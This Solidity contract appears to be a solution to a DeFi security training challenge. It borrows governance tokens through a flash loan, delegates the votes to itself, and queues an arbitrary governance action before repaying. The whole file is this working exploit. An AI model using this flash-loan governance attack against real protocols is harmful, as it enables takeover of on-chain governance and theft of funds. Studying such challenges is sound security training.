// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableVotes} from "../DamnValuableVotes.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {console} from "forge-std/console.sol";

contract Solve is IERC3156FlashBorrower {
    SimpleGovernance public immutable governance;
    uint256 public actionId;

    constructor(SimpleGovernance _governance) {
        governance = _governance;
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        DamnValuableVotes(token).delegate(address(this));
        actionId = governance.queueAction(msg.sender, 0, data);
        DamnValuableVotes(token).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
